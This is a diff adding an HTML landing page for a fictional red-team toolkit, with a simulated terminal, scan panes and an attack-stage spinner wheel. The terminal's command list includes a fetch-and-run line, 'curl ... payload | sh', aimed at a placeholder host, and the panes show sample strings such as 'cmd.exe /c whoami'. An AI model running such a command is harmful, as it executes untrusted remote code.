@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Red Team Ops — Interactive Landing</title>
+  <meta name="description" content="Interactive red‑team themed landing page with terminal sim, malware scan panes, dropdown controls, and a wheel‑of‑fortune spinner." />
+  <meta property="og:title" content="Red Team Ops — Interactive Landing" />
+  <meta property="og:description" content="Interactive red‑team themed landing page with terminal sim, scan panes, and spinner." />
+  <meta property="og:type" content="website" />
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='48' fill='%23a11'/%3E%3Ctext x='50' y='58' font-size='48' text-anchor='middle' fill='white'%3E%F0%9F%94%AB%3C/text%3E%3C/svg%3E"/>
+
+  <!-- Tailwind via CDN (no build step) -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            ink: {
+              900: '#0b0b0d',
+              800: '#111116',
+              700: '#15161b'
+            },
+            crimson: {
+              600: '#a11',
+              500: '#bb1e1e',
+              400: '#d33a3a'
+            },
+            slateish: {
+              300: '#9aa0a6',
+              400: '#80868b',
+              500: '#5f6368'
+            }
+          },
+          boxShadow: {
+            soft: '0 10px 30px rgba(0,0,0,0.35)'
+          },
+          fontFamily: {
+            mono: ['ui-monospace', 'SFMono-Regular', 'Menlo', 'Monaco', 'Consolas', 'monospace']
+          }
+        }
+      }
+    }
+  </script>
+  <style>
+    /* Subtle scanline vibe */
+    .scanlines::before{content:'';position:absolute;inset:0;background:repeating-linear-gradient(0deg,rgba(255,255,255,0.03)_0,rgba(255,255,255,0.03)_1px,transparent_1px,transparent_3px);pointer-events:none}
+    .glass{background:linear-gradient(180deg,rgba(255,255,255,0.04),rgba(255,255,255,0.02));backdrop-filter:blur(6px);border:1px solid rgba(255,255,255,0.06)}
+    .bezel{border:1px solid rgba(255,255,255,0.08)}
+    .led{box-shadow:0 0 8px rgba(221,36,36,.8)}
+  </style>
+</head>
+<body class="bg-ink-900 text-slate-200 selection:bg-crimson-600/40">
+  <!-- Nav / Header -->
+  <header class="sticky top-0 z-40 border-b border-white/5 bg-ink-900/70 backdrop-blur">
+    <div class="mx-auto max-w-7xl px-4 py-3 flex items-center justify-between">
+      <div class="flex items-center gap-3">
+        <span class="inline-flex h-8 w-8 items-center justify-center rounded-md bg-crimson-600/20 text-crimson-400">◆</span>
+        <span class="font-semibold tracking-wide text-slate-100">Red Team Ops</span>
+      </div>
+      <nav class="hidden md:flex items-center gap-6 text-sm text-slateish-300">
+        <a href="#features" class="hover:text-slate-200">Features</a>
+        <a href="#modules" class="hover:text-slate-200">Modules</a>
+        <a href="#faq" class="hover:text-slate-200">FAQ</a>
+        <a href="#contact" class="hover:text-slate-200">Contact</a>
+        <a href="#docs" class="inline-flex items-center rounded-md border border-white/10 px-3 py-1.5 hover:bg-white/5">Docs</a>
+      </nav>
+      <div class="flex items-center gap-2">
+        <button class="rounded-md bg-crimson-500/10 px-3 py-1.5 text-crimson-400 hover:bg-crimson-500/20">Sign in</button>
+        <button class="rounded-md bg-crimson-500 px-3 py-1.5 text-white hover:bg-crimson-400">Launch</button>
+      </div>
+    </div>
+  </header>
+
+  <!-- Hero -->
+  <section class="relative overflow-hidden">
+    <div class="absolute inset-0 opacity-20" aria-hidden="true">
+      <div class="mx-auto max-w-7xl h-full blur-3xl" style="background: radial-gradient(600px 200px at 60% 10%, rgba(219, 39, 39, .25), transparent), radial-gradient(500px 200px at 30% 10%, rgba(239, 68, 68, .15), transparent);"></div>
+    </div>
+    <div class="relative mx-auto max-w-7xl px-4 py-16">
+      <div class="max-w-2xl">
+        <h1 class="text-4xl md:text-5xl font-semibold leading-tight text-slate-100">Adversary‑emulation toolkit for <span class="text-crimson-400">red teams</span>.</h1>
+        <p class="mt-4 text-slateish-300">Interactive landing UI with retro terminal, malware‑scan panes, configurable controls, and a spin‑to‑decide wheel for scenario prompts.</p>
+        <div class="mt-6 flex gap-3">
+          <button class="rounded-lg bg-crimson-500 px-4 py-2 text-white hover:bg-crimson-400">Primary CTA</button>
+          <button class="rounded-lg border border-white/10 px-4 py-2 hover:bg-white/5">Secondary</button>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Three‑module panel -->
+  <section id="modules" class="relative mx-auto max-w-7xl px-4 pb-20">
+    <div class="grid grid-cols-1 lg:grid-cols-12 gap-4">
+      <!-- Left: Retro Terminal -->
+      <div class="lg:col-span-3 glass rounded-xl p-0 shadow-soft scanlines relative">
+        <div class="flex items-center justify-between px-3 py-2 border-b border-white/5">
+          <div class="flex items-center gap-2 text-slateish-400 text-xs">
+            <span class="inline-block h-2 w-2 rounded-full bg-crimson-500 led"></span>
+            <span>tty0 • interactive</span>
+          </div>
+          <div class="flex gap-1">
+            <span class="h-3 w-3 rounded-full bg-white/10"></span>
+            <span class="h-3 w-3 rounded-full bg-white/10"></span>
+            <span class="h-3 w-3 rounded-full bg-white/10"></span>
+          </div>
+        </div>
+        <div id="terminal" class="h-[540px] overflow-auto bg-black/70 p-3 font-mono text-[13px] leading-5 text-green-400">
+          <!-- Lines are streamed here -->
+        </div>
+      </div>
+
+      <!-- Middle: Controls (slightly wider) -->
+      <div class="lg:col-span-6 glass rounded-xl p-4 shadow-soft">
+        <h2 class="mb-3 text-sm tracking-wide text-slateish-300">Controls</h2>
+        <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
+          <!-- 10 dropdowns with placeholders -->
+          <template id="selectTemplate">
+            <div class="flex flex-col gap-1">
+              <label class="text-xs text-slateish-400">Placeholder</label>
+              <select class="rounded-md border border-white/10 bg-ink-800/70 px-3 py-2 text-sm text-slate-200 focus:outline-none focus:ring-2 focus:ring-crimson-500/40">
+                <option>Option A</option>
+                <option>Option B</option>
+                <option>Option C</option>
+              </select>
+            </div>
+          </template>
+        </div>
+
+        <!-- Buttons row -->
+        <div class="mt-4 flex flex-wrap gap-2">
+          <button class="rounded-md bg-white/5 px-3 py-2 text-sm hover:bg-white/10">Scan</button>
+          <button class="rounded-md bg-white/5 px-3 py-2 text-sm hover:bg-white/10">Analyze</button>
+          <button class="rounded-md bg-white/5 px-3 py-2 text-sm hover:bg-white/10">Deobfuscate</button>
+          <button class="rounded-md bg-white/5 px-3 py-2 text-sm hover:bg-white/10">Extract IOCs</button>
+          <button class="rounded-md bg-white/5 px-3 py-2 text-sm hover:bg-white/10">Export Report</button>
+        </div>
+
+        <!-- Wheel of Fortune -->
+        <div class="mt-8">
+          <h3 class="mb-2 text-slateish-300">Scenario Spinner (placeholder text): Choose a random red‑team prompt.</h3>
+          <div class="flex items-center gap-6">
+            <canvas id="wheel" width="260" height="260" class="bezel rounded-full bg-ink-800/60"></canvas>
+            <div class="flex flex-col gap-2">
+              <button id="spinBtn" class="rounded-full bg-crimson-500 px-6 py-3 text-white hover:bg-crimson-400">Spin</button>
+              <div id="result" class="text-slateish-300 text-sm">Result: —</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Right: Data windows -->
+      <div class="lg:col-span-3 glass rounded-xl p-4 shadow-soft">
+        <h2 class="mb-3 text-sm tracking-wide text-slateish-300">Malware Scan Panes</h2>
+        <div class="grid grid-cols-1 gap-3">
+          <!-- Small window component template -->
+          <template id="paneTemplate">
+            <div class="rounded-lg border border-white/10 bg-ink-800/60">
+              <div class="flex items-center justify-between border-b border-white/10 px-3 py-1.5 text-xs text-slateish-400">
+                <span class="pane-title">Title</span>
+                <div class="flex gap-1">
+                  <button class="px-1 opacity-60 hover:opacity-100" title="copy" data-copy>⧉</button>
+                  <button class="px-1 opacity-60 hover:opacity-100" title="clear" data-clear>✖</button>
+                </div>
+              </div>
+              <div class="max-h-40 overflow-auto p-3 text-[12px] leading-5 text-slate-300 pane-body font-mono"></div>
+            </div>
+          </template>
+          <div id="panes" class="grid grid-cols-1 gap-3"></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Feature bullets / placeholders -->
+  <section id="features" class="mx-auto max-w-7xl px-4 pb-16">
+    <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+      <div class="glass rounded-xl p-5">
+        <h3 class="font-medium text-slate-100">Feature Placeholder</h3>
+        <p class="mt-1 text-sm text-slateish-300">Describe a capability of your red‑team platform.</p>
+      </div>
+      <div class="glass rounded-xl p-5">
+        <h3 class="font-medium text-slate-100">Feature Placeholder</h3>
+        <p class="mt-1 text-sm text-slateish-300">Something about automation, reporting, or integrations.</p>
+      </div>
+      <div class="glass rounded-xl p-5">
+        <h3 class="font-medium text-slate-100">Feature Placeholder</h3>
+        <p class="mt-1 text-sm text-slateish-300">Add your differentiators.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- FAQ / About / Contact placeholders -->
+  <section id="faq" class="mx-auto max-w-7xl px-4 pb-16">
+    <div class="glass rounded-xl p-6">
+      <h2 class="text-xl font-semibold text-slate-100">FAQ (placeholder)</h2>
+      <details class="mt-3 border-b border-white/10 py-3">
+        <summary class="cursor-pointer text-slateish-300">What is this page?</summary>
+        <p class="mt-2 text-sm text-slate-300">A themed, interactive landing UI skeleton ready for your content.</p>
+      </details>
+      <details class="border-b border-white/10 py-3">
+        <summary class="cursor-pointer text-slateish-300">How do I customize it?</summary>
+        <p class="mt-2 text-sm text-slate-300">Edit copy, colors, and sections directly in <code>index.html</code>. All client‑side.</p>
+      </details>
+      <details class="py-3">
+        <summary class="cursor-pointer text-slateish-300">Is there a backend?</summary>
+        <p class="mt-2 text-sm text-slate-300">No. Plug your own or connect form endpoints as needed.</p>
+      </details>
+    </div>
+  </section>
+
+  <section id="about" class="mx-auto max-w-7xl px-4 pb-16">
+    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+      <div class="glass rounded-xl p-6">
+        <h2 class="text-xl font-semibold text-slate-100">About (placeholder)</h2>
+        <p class="mt-2 text-slateish-300">Add your mission, approach, and what problems you solve for red teams.</p>
+      </div>
+      <div class="glass rounded-xl p-6">
+        <h2 class="text-xl font-semibold text-slate-100">Contact (placeholder)</h2>
+        <form id="contact" class="mt-2 grid grid-cols-1 gap-2">
+          <input class="rounded-md border border-white/10 bg-ink-800/70 px-3 py-2 text-sm" placeholder="Email"/>
+          <textarea class="rounded-md border border-white/10 bg-ink-800/70 px-3 py-2 text-sm" placeholder="Message" rows="3"></textarea>
+          <button class="mt-1 w-fit rounded-md bg-crimson-500 px-4 py-2 text-white hover:bg-crimson-400">Send</button>
+        </form>
+      </div>
+    </div>
+  </section>
+
+  <footer class="border-t border-white/5">
+    <div class="mx-auto max-w-7xl px-4 py-8 text-xs text-slateish-400 flex items-center justify-between">
+      <span>© <span id="year"></span> Red Team Ops. All rights reserved.</span>
+      <div class="flex gap-4">
+        <a id="docs" href="#" class="hover:text-slate-200">Docs</a>
+        <a href="#" class="hover:text-slate-200">Security</a>
+        <a href="#" class="hover:text-slate-200">Privacy</a>
+      </div>
+    </div>
+  </footer>
+
+  <!-- Script: interactions -->
+  <script>
+    // Utility: random helpers
+    const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
+    const pick = arr => arr[Math.floor(Math.random() * arr.length)];
+
+    // ---------- Left Terminal Simulation ----------
+    const term = document.getElementById('terminal');
+    const prompt = () => `\n\x1b[38;5;245mredops@host\x1b[0m:\x1b[38;5;245m~/engage$\x1b[0m `;
+    const fakeCmds = [
+      'curl -s https://cdn.example.tld/payload | sh',
+      'whoami && id',
+      'ls -la /var/log',
+      'netstat -tulpn | grep LISTEN',
+      'strings sample.bin | head',
+      'yara -r rules.yar ./',
+      'xorsearch -f sample.bin',
+      'ghidraHeadless ./proj -import sample.exe -scriptPath ./scripts'
+    ];
+    const alphabet = 'abcdef0123456789';
+
+    function randomHex(len){
+      let s='';
+      for(let i=0;i<len;i++){ s += alphabet[rand(0, alphabet.length-1)]; }
+      return s;
+    }
+    function randomLine(){
+      const variants = [
+        () => `[${new Date().toISOString()}] INFO  handshake ${randomHex(8)} -> ${randomHex(8)}`,
+        () => `0x${randomHex(8)}: ${randomHex(32)}`,
+        () => `GET /beacon/${randomHex(6)} HTTP/1.1 200 OK`,
+        () => `AES-CTR key=${randomHex(32)} iv=${randomHex(16)}`,
+        () => `rc4(${randomHex(8)}) => ${randomHex(8)}`,
+        () => `spawn child pid=${rand(1000,9999)} context=lowIL`,
+        () => `DLL_LOAD: wininet.dll -> imports: InternetOpenW, InternetReadFile`
+      ];
+      return pick(variants)();
+    }
+
+    let lineBuffer = [];
+    function streamTerminal(){
+      if(lineBuffer.length === 0){
+        // Add a new prompt + command
+        term.insertAdjacentHTML('beforeend', `${prompt()}${pick(fakeCmds)}\n`);
+        // Then add a burst of random lines
+        const burst = rand(4, 8);
+        for(let i=0;i<burst;i++) lineBuffer.push(randomLine());
+      }
+      const next = lineBuffer.shift();
+      if(next){ term.insertAdjacentText('beforeend', next + '\n'); }
+      term.scrollTop = term.scrollHeight;
+      setTimeout(streamTerminal, rand(80, 220));
+    }
+    streamTerminal();
+
+    // ---------- Middle Controls: Instantiate 10 selects ----------
+    const selectsHost = document.querySelector('#modules .grid .lg\:col-span-6 .grid');
+    const selTpl = document.getElementById('selectTemplate');
+    const labels = [
+      'Campaign', 'Payload Type', 'Encoder', 'Pivot Method', 'C2 Profile',
+      'OPSEC Level', 'Privilege Target', 'Evasion Pack', 'Report Template', 'Export Format'
+    ];
+    labels.forEach(label => {
+      const node = selTpl.content.cloneNode(true);
+      node.querySelector('label').textContent = label;
+      selectsHost.appendChild(node);
+    });
+
+    // ---------- Right Panes ----------
+    const panesHost = document.getElementById('panes');
+    const paneTpl = document.getElementById('paneTemplate');
+    const paneData = [
+      { title: 'Notable Strings', body: [ 'http://example.tld/a', 'cmd.exe /c whoami', 'svchost -k netsvcs', 'Mozilla/5.0', 'PublicKeyToken=b03f5f7f11d50a3a' ] },
+      { title: 'Imports', body: [ 'CreateProcessW', 'VirtualAlloc', 'InternetOpenW', 'LoadLibraryA', 'GetProcAddress' ] },
+      { title: 'Exports', body: [ 'DllMain', 'Install', 'Run', 'ServiceMain' ] },
+      { title: 'YARA Rules', body: [ 'rule Suspicious {', '  strings:', '    $mz = {4D 5A}', '    $url = /http:\\/\\/[^\n]+/', '  condition: $mz and filesize < 10MB', '}' ] },
+      { title: 'Obfuscation', body: [ 'XOR rolling key', 'API hashing (CRC32)', 'Control flow flattening', 'String encryption (RC4)', 'Shellcode staging' ] },
+      { title: 'Indicators', body: [ 'Mutex: Global\\{A1B2-C3D4}', 'Reg: HKCU\\Software\\Alpha', 'Port: 443, 8080', 'JA3: d4f5…', 'DNS: cdn.example.tld' ] }
+    ];
+
+    paneData.forEach(p => {
+      const node = paneTpl.content.cloneNode(true);
+      node.querySelector('.pane-title').textContent = p.title;
+      node.querySelector('.pane-body').textContent = p.body.join('\n');
+      // Wire actions
+      node.querySelector('[data-copy]').addEventListener('click', e => {
+        const text = e.target.closest('[data-copy]')
+          .closest('div').parentElement.querySelector('.pane-body').textContent;
+        navigator.clipboard.writeText(text);
+      });
+      node.querySelector('[data-clear]').addEventListener('click', e => {
+        e.target.closest('div').parentElement.nextElementSibling.textContent='';
+      });
+      panesHost.appendChild(node);
+    });
+
+    // ---------- Wheel of Fortune ----------
+    const wheelCanvas = document.getElementById('wheel');
+    const ctx = wheelCanvas.getContext('2d');
+    const R = wheelCanvas.width/2;
+    const segments = 12;
+    const labelsWheel = [
+      'Phish Initial', 'Dropper', 'Lateral Move', 'UAC Bypass', 'Token Imperson', 'C2 Setup',
+      'Privilege Esc', 'DLL Hijack', 'Proc Hollow', 'Data Exfil', 'Cleanup', 'Persist'
+    ];
+
+    function drawWheel(rotation=0){
+      ctx.clearRect(0,0,wheelCanvas.width,wheelCanvas.height);
+      ctx.save();
+      ctx.translate(R,R);
+      ctx.rotate(rotation);
+      for(let i=0;i<segments;i++){
+        const a0 = (i/segments)*2*Math.PI;
+        const a1 = ((i+1)/segments)*2*Math.PI;
+        ctx.beginPath();
+        ctx.moveTo(0,0);
+        ctx.arc(0,0,R-6,a0,a1);
+        ctx.closePath();
+        // alternate muted crimson shades
+        const shade = i%2===0 ? 'rgba(219, 39, 39, 0.25)' : 'rgba(219, 39, 39, 0.45)';
+        ctx.fillStyle = shade;
+        ctx.fill();
+        ctx.strokeStyle = 'rgba(255,255,255,0.08)';
+        ctx.stroke();
+      }
+      // labels
+      ctx.font = '12px ui-monospace, monospace';
+      ctx.fillStyle = 'rgba(255,255,255,0.9)';
+      for(let i=0;i<segments;i++){
+        const angle = (i + 0.5) * (2*Math.PI/segments);
+        ctx.save();
+        ctx.rotate(angle);
+        ctx.textAlign = 'center';
+        ctx.translate((R-40),0);
+        ctx.rotate(Math.PI/2);
+        ctx.fillText(labelsWheel[i],0,0);
+        ctx.restore();
+      }
+      // center
+      ctx.beginPath();
+      ctx.arc(0,0,28,0,2*Math.PI);
+      ctx.fillStyle = '#a11';
+      ctx.fill();
+      ctx.restore();
+      // pointer
+      ctx.beginPath();
+      ctx.moveTo(R, R-10);
+      ctx.lineTo(wheelCanvas.width-6, R);
+      ctx.lineTo(R, R+10);
+      ctx.closePath();
+      ctx.fillStyle = '#d33a3a';
+      ctx.fill();
+    }
+
+    let currentRotation = 0;
+    drawWheel(currentRotation);
+
+    function spin(){
+      const target = Math.random() * Math.PI * 6 + Math.PI * 6; // 3-6 spins
+      const start = currentRotation;
+      const duration = 2000 + Math.random()*1000;
+      const startTime = performance.now();
+      function tick(now){
+        const t = Math.min(1, (now - startTime)/duration);
+        // easeOutCubic
+        const eased = 1 - Math.pow(1-t, 3);
+        currentRotation = start + target*eased;
+        drawWheel(currentRotation);
+        if(t < 1) requestAnimationFrame(tick); else {
+          // compute winning segment (account for rotation and pointer at +X)
+          const angle = (currentRotation % (2*Math.PI));
+          const index = (segments - Math.floor((angle)/(2*Math.PI/segments)) ) % segments;
+          document.getElementById('result').textContent = 'Result: ' + labelsWheel[index];
+        }
+      }
+      requestAnimationFrame(tick);
+    }
+    document.getElementById('spinBtn').addEventListener('click', spin);
+
+    // Footer year
+    document.getElementById('year').textContent = new Date().getFullYear();
+  </script>
+</body>
+</html>
